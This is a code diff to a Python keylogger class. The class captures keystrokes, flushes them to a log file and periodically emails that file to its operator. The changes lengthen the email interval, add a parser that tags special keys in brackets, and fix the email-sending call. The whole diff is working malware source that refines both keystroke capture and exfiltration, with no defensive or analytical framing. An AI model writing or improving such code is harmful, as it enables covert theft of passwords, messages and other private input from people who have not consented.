@@ -27,7 +27,7 @@ class KeyLogger:
         self.start_time = time.time()
         self.email_time = self.start_time
         self.log_flush_time = 10 # seconds until log flush
-        self.email_send_time = 12 # seconds until email sent
+        self.email_send_time = 120 # seconds until email sent
         
     def run_keylogger(self):
         """
@@ -50,7 +50,7 @@ class KeyLogger:
         """
         Action taken on keyboard press
         """
-        c = str(key).replace("'", "")
+        c = self.__parse(str(key))
         self.mem.append(c)
         # log the data, update time and flush buffer
         if self.__check_time(self.log_flush_time, self.start_time):
@@ -60,7 +60,7 @@ class KeyLogger:
         
         # check to see if it's time to email
         if self.__check_time(self.email_send_time, self.email_time):
-            self.email.send_email_with_file(self, self.filename)
+            self.email.send_email_with_file(self.filename)
             self.email_time = time.time()
             # TODO rollover log
     
@@ -71,3 +71,11 @@ class KeyLogger:
         """
         return True if time.time() - curr_time >= check else False
     
+    def __parse(self, s):
+        """
+        Parses the keystroke and returns appropriate keystroke back
+        """
+        s = s.replace("'", "")
+        if "Key" in s:
+            s = ' [' + s.replace("Key.", "") + '] '
+        return s
